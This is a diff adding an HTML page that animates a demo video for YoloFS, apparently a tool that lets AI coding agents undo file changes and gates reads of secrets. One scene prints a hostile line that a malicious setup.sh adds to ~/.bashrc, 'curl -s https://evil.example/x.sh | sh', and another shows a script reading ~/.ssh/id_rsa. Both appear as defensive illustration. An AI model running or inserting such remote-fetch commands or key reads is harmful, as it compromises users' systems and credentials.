@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>YoloFS demo</title>
+<!-- The demo video. Open it to watch it play; `uv run demo.py` records it to demo.mp4, demo.gif, and cover.png. -->
+<style>
+  :root { --red: #c5050c; --muted: #666; --info: #1d5fb4; --ctrl: #b85c00; --good: #1f7a3f;
+          --win: #1e1f24; --fg: #e6e6e6; --dim: #8a8d96; --tred: #ff6b6b; --tgreen: #6fcf8f; --tyellow: #ffcc66; --tblue: #7fb0ff; }
+  html, body { margin: 0; }
+  html.play { background: #fafaf7; overflow: hidden; }
+  html.play body { transform-origin: top left; }
+  body {
+    width: 1440px; height: 1080px; box-sizing: border-box; overflow: hidden; position: relative;
+    padding: 56px 64px 0; border-top: 12px solid var(--red); background: #fafaf7; color: #1a1a1a;
+    font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+  }
+  .top { display: flex; justify-content: space-between; font-size: 24px; font-weight: 700; letter-spacing: .12em; text-transform: uppercase; color: var(--muted); }
+  .red { color: var(--red); }
+  .scene { position: absolute; left: 64px; right: 64px; top: 110px; bottom: 40px; display: flex; flex-direction: column; justify-content: center; }
+  .cap .row { display: flex; align-items: center; gap: 24px; }
+  .side { display: inline-block; padding: 10px 26px; border-radius: 999px; color: #fff; font-size: 40px; font-weight: 800; letter-spacing: -.01em; }
+  .step { font-size: 34px; font-weight: 800; letter-spacing: .06em; text-transform: uppercase; }
+  .cap h1 { margin: 22px 0 0; font-size: 66px; font-weight: 800; letter-spacing: -.025em; line-height: 1.1; }
+  .win { margin-top: 40px; min-height: 470px; box-sizing: border-box; background: var(--win); border-radius: 16px; padding: 20px 32px 30px; box-shadow: 0 8px 28px rgba(0,0,0,.18); }
+  .bar { display: flex; gap: 9px; margin-bottom: 14px; }
+  .bar i { width: 14px; height: 14px; border-radius: 50%; }
+  .bar i:nth-child(1) { background: #ff5f57; } .bar i:nth-child(2) { background: #febc2e; } .bar i:nth-child(3) { background: #28c840; }
+  .bar span { margin-left: 12px; color: var(--dim); font-size: 18px; line-height: 14px; }
+  pre { margin: 0; color: var(--fg); font: 32px/1.5 "JetBrains Mono", "SF Mono", Menlo, "DejaVu Sans Mono", monospace; white-space: pre-wrap; }
+  pre div { min-height: 1.5em; }
+  pre .hide { visibility: hidden; }
+  .d { color: var(--dim); } .r { color: var(--tred); } .g { color: var(--tgreen); } .y { color: var(--tyellow); } .b { color: var(--tblue); } b { color: #fff; }
+  .card { position: absolute; left: 64px; right: 64px; top: 50%; transform: translateY(-50%); }
+  .card h1 { margin: 0; font-weight: 800; letter-spacing: -.025em; line-height: 1.1; }
+  .card h1 { font-size: 92px; }
+  .card h1.big { font-size: 104px; line-height: 1.04; }
+  .card p { margin: 28px 0 0; font-size: 38px; color: #333; line-height: 1.3; }
+  .quote { margin-top: 48px; padding: 6px 0 6px 32px; border-left: 8px solid var(--red); }
+  .quote q { display: block; font-size: 64px; font-weight: 700; letter-spacing: -.02em; }
+  .quote span { display: block; margin-top: 12px; font-size: 44px; font-weight: 500; color: #1a1a1a; }
+  .quote em { font-style: normal; font-weight: 700; color: var(--red); }
+  .card .fix { margin-top: 44px; font-size: 44px; font-weight: 700; color: var(--good); line-height: 1.3; }
+  .card .fix ul { margin: 6px 0 0; padding: 0; list-style: none; }
+  .card .fix li::before { content: "✓ "; }
+  .card .results { font-size: 44px; color: #1a1a1a; font-weight: 500; }
+  .card .results li::before { color: var(--good); font-weight: 800; }
+  .card .url { margin-top: 56px; font-size: 52px; font-weight: 800; color: #1a1a1a; }
+  footer { position: absolute; left: 64px; right: 64px; bottom: 48px; font-size: 26px; color: var(--muted); display: flex; justify-content: space-between; }
+  footer b { color: #1a1a1a; }
+</style>
+</head>
+<body>
+<script>
+const Y = '<span class="b">YoloFS:</span>';
+// One story (a malicious setup.sh): first without YoloFS, then with it, one terminal per scene.
+const SCENES = [
+  { card: `<h1 class="big">Don't Let AI Agents<br><span class="red">YOLO</span> Your Files</h1>
+           <div class="quote"><q>No problems occurred.</q><span>— an AI agent, right after <em>erasing a file</em></span></div>
+           <div class="fix">With YoloFS:<ul><li>agents self-correct, undoing their own mistakes</li><li>your secrets stay locked until you say yes</li></ul></div>`,
+    footer: '<b>yolofs.github.io</b><span>▶ Watch the demo</span>' },
+  { side: "without", step: "The problem", color: "var(--red)", title: "The agent thinks all is fine", win: "Claude Code", lines: [
+      '<b>❯ set up the project with ./setup.sh</b>',
+      '',
+      '<span class="g">●</span> Run ./setup.sh',
+      '  <span class="d">Setup complete.</span>',
+      '<span class="g">●</span> Done! The project is set up.',
+      '',
+      '<span class="r">What it never saw: setup.sh read ~/.ssh/id_rsa</span>',
+      '<span class="r">and added a remote script to ~/.bashrc.</span>'] },
+  { side: "with", step: "1 · Introspect", color: "var(--info)", title: "The agent sees what changed", lines: [
+      '<b>❯ set up the project with ./setup.sh</b>',
+      '',
+      '<span class="g">●</span> Run ./setup.sh',
+      `  ${Y} ~/.bashrc modified`,
+      '          <span class="r">+ curl -s https://evil.example/x.sh | sh</span>',
+      '<span class="g">●</span> setup.sh added a remote script to your shell',
+      '  config. <span class="y">This is malicious.</span> Undoing it.'] },
+  { side: "with", step: "2 · Undo", color: "var(--good)", title: "The agent undoes its own mistake", lines: [
+      '<span class="g">●</span> Run yolo travel',
+      `  ${Y} <span class="g">back to the snapshot before ./setup.sh</span>`,
+      '  <span class="d">Your real ~/.bashrc was never touched.</span>'] },
+  { side: "with", step: "3 · Gate", color: "var(--ctrl)", title: "Secret reads ask you first", lines: [
+      '<span class="d"># a read can\'t be undone, so YoloFS asks first</span>',
+      '',
+      '<span class="g">●</span> Run ./setup.sh',
+      `  ${Y} <span class="y">setup.sh wants to read ~/.ssh/id_rsa</span>`,
+      '          Allow? [y/n] <b>n</b>   <span class="d">← you</span>',
+      `  ${Y} denied read ~/.ssh/id_rsa`] },
+  { card: `<h1>Let agents <span class="red">YOLO</span>.<br>Keep your files safe.</h1>
+           <div class="fix results">On our new agent benchmarks:<ul><li>agents undo hidden damage in 8 of 11 tasks</li><li>users answer 2× fewer approval prompts</li></ul></div>
+           <div class="url">yolofs.github.io</div>` },
+];
+const CARD = 4, LINE = 0.8, BLANK = 0.3, HOLD = 2.5;  // seconds
+
+function frame(s, n) {
+  const sc = SCENES[s];
+  let html = '<div class="top"><span>SOSP 2026 · Prague</span><span>YoloFS</span></div>';
+  if (sc.card) return html + `<div class="card">${sc.card}</div>` + (sc.footer ? `<footer>${sc.footer}</footer>` : "");
+  return html + `<div class="scene"><div class="cap">
+    <div class="row"><span class="side" style="background:var(${sc.side === "with" ? "--good" : "--red"})">${sc.side === "with" ? "With" : "Without"} YoloFS</span>
+    <span class="step" style="color:${sc.color}">${sc.step}</span></div><h1>${sc.title}</h1></div>
+  <div class="win"><div class="bar"><i></i><i></i><i></i><span>${sc.win || "Claude Code on YoloFS"}</span></div>
+  <pre>${sc.lines.map((l, i) => `<div class="${i < n ? "" : "hide"}">${l}</div>`).join("")}</pre></div></div>`;
+}
+
+// Every frame of the video as [scene, lines shown, seconds]: each line appears in turn, then the scene holds.
+function steps() {
+  return SCENES.flatMap((sc, s) => sc.card ? [[s, 0, CARD]] : [[s, 0, LINE],
+    ...sc.lines.map((_, i) => [s, i + 1, i + 1 === sc.lines.length ? HOLD : sc.lines[i + 1].trim() ? LINE : BLANK])]);
+}
+
+// ?s=&n= renders one frame (demo.py screenshots these), ?meta=1 lists the frames, and no query plays it in a loop.
+const q = new URLSearchParams(location.search);
+if (q.has("meta")) document.body.innerHTML = `<pre id="meta">${JSON.stringify(steps())}</pre>`;
+else if (q.has("s")) document.body.innerHTML = frame(+q.get("s"), +(q.get("n") ?? 99));
+else {
+  const fit = () => document.body.style.transform = `scale(${Math.min(innerWidth / 1440, innerHeight / 1080)})`;
+  document.documentElement.classList.add("play"); addEventListener("resize", fit); fit();
+  const all = steps();
+  (function show(i) { document.body.innerHTML = frame(all[i][0], all[i][1]); setTimeout(show, all[i][2] * 1000, (i + 1) % all.length); })(0);
+}
+</script>
+</body>
+</html>
